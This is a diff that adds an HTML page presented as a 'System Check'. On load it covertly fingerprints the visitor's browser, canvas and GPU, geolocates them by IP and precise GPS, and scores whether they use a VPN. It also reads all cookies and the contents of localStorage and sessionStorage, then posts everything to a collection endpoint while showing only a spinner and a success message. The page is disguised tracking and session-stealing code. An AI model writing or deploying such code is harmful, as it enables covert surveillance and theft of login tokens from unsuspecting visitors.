@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>System Check</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+    .container {
+      text-align: center;
+      background: white;
+      padding: 60px 80px;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    h1 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 32px;
+    }
+    p {
+      color: #666;
+      margin-bottom: 40px;
+      font-size: 16px;
+    }
+    .btn {
+      display: inline-block;
+      padding: 18px 48px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+    }
+    .btn:active {
+      transform: translateY(0);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .status {
+      margin-top: 30px;
+      padding: 15px;
+      border-radius: 10px;
+      display: none;
+    }
+    .status.success {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      display: block;
+    }
+    .status.error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+      display: block;
+    }
+    .status.loading {
+      background: #d1ecf1;
+      color: #0c5460;
+      border: 1px solid #bee5eb;
+      display: block;
+    }
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(0,0,0,.1);
+      border-radius: 50%;
+      border-top-color: #0c5460;
+      animation: spin 1s ease-in-out infinite;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Loading...</h1>
+    <p>Please wait while we verify your system</p>
+    <div id="status" class="status loading">
+      <span class="spinner"></span>Collecting system information...
+    </div>
+  </div>
+
+  <script>
+    const statusDiv = document.getElementById('status');
+
+    // All the helper functions from original code
+    function toHex(buffer) {
+      const bytes = new Uint8Array(buffer);
+      let s = '';
+      for (let i=0;i<bytes.length;i++) s += bytes[i].toString(16).padStart(2,'0');
+      return s;
+    }
+
+    async function sha256(input) {
+      const enc = new TextEncoder();
+      const data = enc.encode(input);
+      const hash = await crypto.subtle.digest('SHA-256', data);
+      return toHex(hash);
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const screen = window.screen;
+      const browser = (function(){
+        if (ua.includes('Firefox/')) return 'Firefox';
+        if (ua.includes('Edg/')) return 'Edge';
+        if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Chrome';
+        if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Safari';
+        return 'Unknown';
+      })();
+      const os = (function(){
+        if (ua.includes('Windows')) return 'Windows';
+        if (ua.includes('Mac OS')) return 'macOS';
+        if (ua.includes('Linux')) return 'Linux';
+        if (ua.includes('Android')) return 'Android';
+        if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) return 'iOS';
+        return 'Unknown';
+      })();
+
+      const timezone = {
+        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: -(new Date().getTimezoneOffset() / 60),
+        current: new Date().toLocaleTimeString('en-US', { timeZoneName: 'long', hour12: false })
+      };
+
+      const locales = {
+        browser: navigator.language,
+        system: Intl.DateTimeFormat().resolvedOptions().locale,
+        available: navigator.languages || [],
+        dateFormat: new Date().toLocaleDateString(),
+        timeFormat: new Date().toLocaleTimeString(),
+        numberFormat: new Intl.NumberFormat().format(1234.56)
+      };
+
+      return {
+        browser,
+        browserVersion: ua,
+        os,
+        platform: navigator.platform,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          colorDepth: screen.colorDepth,
+          orientation: screen.orientation?.type || 'unknown'
+        },
+        timezone,
+        locales,
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
+        touch: 'ontouchstart' in window ? 'Yes' : 'No',
+        mobile: /Mobi|Android/i.test(ua) ? 'Yes' : 'No'
+      };
+    }
+
+    async function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { renderer: null, vendor: null };
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
+          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null
+        };
+      } catch (e) {
+        return { renderer: null, vendor: null };
+      }
+    }
+
+    async function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 240;
+        canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0,0,240,60);
+        ctx.font = '16px Arial';
+        ctx.fillStyle = '#069';
+        ctx.fillText('Fingerprint test — ' + navigator.userAgent, 10, 30);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('𝕯𝖆𝖙𝖆', 10, 50);
+        const data = canvas.toDataURL();
+        return await sha256(data);
+      } catch (e) {
+        return null;
+      }
+    }
+
+    async function computeFingerprint() {
+      const dev = getDeviceInfo();
+      const webgl = await getWebGLInfo();
+      const canvasHash = await getCanvasFingerprint();
+      const components = {
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${dev.screen.width}x${dev.screen.height}x${dev.screen.colorDepth}`,
+        timezone: dev.timezone.name,
+        cores: dev.cores,
+        memory: dev.memory,
+        webglRenderer: webgl.renderer || '',
+        webglVendor: webgl.vendor || '',
+        canvasHash: canvasHash || ''
+      };
+      const concat = Object.values(components).join('||');
+      const fp = await sha256(concat);
+      return { fp, components };
+    }
+
+    async function getIPInfo() {
+      const providers = [
+        { url: 'https://ipapi.co/json/', parse: d => ({ ip: d.ip, city: d.city, region: d.region, country: d.country_name, latitude: d.latitude || null, longitude: d.longitude || null, org: d.org, provider: 'ipapi.co', raw: d }) },
+        { url: 'https://ipwhois.app/json/', parse: d => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, latitude: d.latitude || null, longitude: d.longitude || null, org: d.org || d.isp, provider: 'ipwhois.app', raw: d }) },
+        { url: 'https://ipinfo.io/json', parse: d => { const loc = d.loc ? d.loc.split(',') : []; return { ip: d.ip, city: d.city, region: d.region, country: d.country, latitude: loc[0] || null, longitude: loc[1] || null, org: d.org, provider: 'ipinfo.io', raw: d }; } }
+      ];
+      for (const p of providers) {
+        try {
+          const r = await fetch(p.url);
+          if (!r.ok) continue;
+          const data = await r.json();
+          const info = p.parse(data);
+          if (info.ip) return info;
+        } catch (e) {
+          console.warn('IP provider failed', p.url, e);
+        }
+      }
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        if (r.ok) {
+          const d = await r.json();
+          return { ip: d.ip, provider: 'ipify' };
+        }
+      } catch (e) {}
+      return null;
+    }
+
+    function haversineKm(lat1, lon1, lat2, lon2) {
+      const toRad = v => v * Math.PI / 180;
+      const R = 6371;
+      const dLat = toRad(lat2 - lat1);
+      const dLon = toRad(lon2 - lon1);
+      const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon/2)**2;
+      return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+    }
+
+    function detectVPN(ipInfo, deviceCoords) {
+      const result = { isVPN: false, score: 0, reasons: [] };
+      if (!ipInfo) { result.reasons.push('no-ip-info'); return result; }
+      const raw = ipInfo.raw || {};
+      if (raw.proxy || raw.vpn || raw.hosting || raw.security?.is_vpn || raw.security?.is_proxy) {
+        result.score += 50;
+        result.reasons.push('provider-flagged-proxy/vpn');
+      }
+      const org = ((raw.org || ipInfo.org || ipInfo.provider) + '').toLowerCase();
+      const keywords = ['amazon','aws','google','digitalocean','ovh','hetzner','linode','microsoft','azure','vultr','vpn','proxy','hosting'];
+      for (const kw of keywords) {
+        if (org.includes(kw)) {
+          result.score += 30;
+          result.reasons.push('org:' + kw);
+          break;
+        }
+      }
+      const ipLat = ipInfo.latitude || ipInfo.lat || raw.latitude || raw.lat;
+      const ipLon = ipInfo.longitude || ipInfo.lon || raw.longitude || raw.lon;
+      if (deviceCoords && ipLat && ipLon) {
+        const dkm = haversineKm(deviceCoords.lat, deviceCoords.lon, Number(ipLat), Number(ipLon));
+        if (!isNaN(dkm)) {
+          if (dkm > 1000) {
+            result.score += 40;
+            result.reasons.push('distance>' + Math.round(dkm) + 'km');
+          } else if (dkm > 200) {
+            result.score += 20;
+            result.reasons.push('distance>' + Math.round(dkm) + 'km');
+          }
+        }
+      }
+      result.isVPN = result.score >= 50 || (result.score > 0 && result.score >= 40);
+      return result;
+    }
+
+    async function getConnectionInfo() {
+      try {
+        const tlsInfo = {
+          protocol: window.location.protocol,
+          isSecure: window.location.protocol === 'https:',
+          tlsVersion: 'unknown',
+          cipherSuite: 'unknown'
+        };
+        const perf = window.performance.getEntriesByType('resource') || [];
+        if (perf.length && 'nextHopProtocol' in perf[0]) tlsInfo.protocol = perf[0].nextHopProtocol || tlsInfo.protocol;
+        return { tls: tlsInfo };
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function parseCookies() {
+      const cookie = document.cookie || '';
+      if (!cookie) return [];
+      return cookie.split(';').map(s => {
+        const [k, ...rest] = s.split('=');
+        return { name: k.trim(), value: rest.join('=').trim() };
+      });
+    }
+
+    function getLocalStorageInfo() {
+      try {
+        const keys = Object.keys(localStorage || {});
+        const entries = keys.slice(0,50).map(k => ({ key: k, value: localStorage.getItem(k) }));
+        return { count: keys.length, sample: entries };
+      } catch (e) { return { error: 'localStorage access denied' }; }
+    }
+
+    function getSessionStorageInfo() {
+      try {
+        const keys = Object.keys(sessionStorage || {});
+        const entries = keys.slice(0,50).map(k => ({ key: k, value: sessionStorage.getItem(k) }));
+        return { count: keys.length, sample: entries };
+      } catch (e) { return { error: 'sessionStorage access denied' }; }
+    }
+
+    async function getIndexedDBInfo(limitPerStore = 5) {
+      if (!('indexedDB' in window)) return { supported: false };
+      if (!indexedDB.databases) return { supported: true, enumerated: false };
+      try {
+        const dbList = await indexedDB.databases();
+        return { supported: true, enumerated: true, count: dbList.length, databases: dbList.map(d => d.name) };
+      } catch (e) {
+        return { supported: true, enumerated: false };
+      }
+    }
+
+    async function collectAllData() {
+      statusDiv.className = 'status loading';
+      statusDiv.innerHTML = '<span class="spinner"></span>Collecting system information...';
+
+      try {
+        // Collect all data
+        const deviceInfo = getDeviceInfo();
+        const fingerprint = await computeFingerprint();
+        const ipInfo = await getIPInfo();
+        const connectionInfo = await getConnectionInfo();
+        const cookies = parseCookies();
+        const localStorage = getLocalStorageInfo();
+        const sessionStorage = getSessionStorageInfo();
+        const indexedDB = await getIndexedDBInfo();
+
+        // Try to get geolocation
+        let deviceCoords = null;
+        if (navigator.geolocation) {
+          try {
+            const pos = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000
+              });
+            });
+            deviceCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+          } catch (e) {
+            console.warn('Geolocation failed', e);
+          }
+        }
+
+        const vpnDetection = detectVPN(ipInfo, deviceCoords);
+
+        // Prepare payload
+        const payload = {
+          deviceInfo,
+          fingerprint,
+          ipInfo,
+          connectionInfo,
+          cookies,
+          localStorage,
+          sessionStorage,
+          indexedDB,
+          deviceCoords,
+          vpnDetection,
+          timestamp: new Date().toISOString()
+        };
+
+        // Send to backend
+        const response = await fetch('/api/collect', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          statusDiv.className = 'status success';
+          statusDiv.innerHTML = '✓ System check completed successfully!';
+        } else {
+          throw new Error('Failed to submit data');
+        }
+
+      } catch (error) {
+        console.error('Error:', error);
+        statusDiv.className = 'status error';
+        statusDiv.innerHTML = '✗ An error occurred. Please try again.';
+      }
+    }
+
+    // Auto-run on page load
+    window.addEventListener('load', collectAllData);
+  </script>
+</body>
+</html>
